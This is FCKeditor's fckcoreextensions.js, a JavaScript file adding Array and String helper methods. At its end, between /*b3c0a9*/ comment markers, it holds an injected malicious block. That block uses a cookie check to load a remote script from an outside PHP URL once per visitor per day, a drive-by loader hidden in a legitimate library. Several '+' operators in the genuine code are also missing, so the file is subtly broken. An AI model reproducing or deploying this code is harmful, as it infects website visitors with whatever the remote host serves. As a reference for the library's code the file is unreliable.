/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckcoreextensions.js
 * 	Some extensions to the Javascript Core.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

// Extends the Array object, creating a "addItem" method on it.
Array.prototype.addItem = function( item )
{
	var i = this.length ;
	this[ i ] = item ;
	return i ;
}

Array.prototype.indexOf = function( value )
{
	for ( var i = 0 ; i < this.length ; i   )
	{
		if ( this[i] == value )
			return i ;
	}
	return -1 ;
}

String.prototype.startsWith = function( value )
{
	return ( this.substr( 0, value.length ) == value ) ;
}

// Extends the String object, creating a "endsWith" method on it.
String.prototype.endsWith = function( value, ignoreCase )
{
	var L1 = this.length ;
	var L2 = value.length ;
	
	if ( L2 > L1 )
		return false ;

	if ( ignoreCase )
	{
		var oRegex = new RegExp( value   '$' , 'i' ) ;
		return oRegex.test( this ) ;
	}
	else
		return ( L2 == 0 || this.substr( L1 - L2, L2 ) == value ) ;
}

String.prototype.remove = function( start, length )
{
	var s = '' ;
	
	if ( start > 0 )
		s = this.substring( 0, start ) ;
	
	if ( start   length < this.length )
		s  = this.substring( start   length , this.length ) ;
		
	return s ;
}

String.prototype.trim = function()
{
	return this.replace( /(^\s*)|(\s*$)/g, '' ) ;
}

String.prototype.ltrim = function()
{
	return this.replace( /^\s*/g, '' ) ;
}

String.prototype.rtrim = function()
{
	return this.replace( /\s*$/g, '' ) ;
}

String.prototype.replaceNewLineChars = function( replacement )
{
	return this.replace( /\n/g, replacement ) ;
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
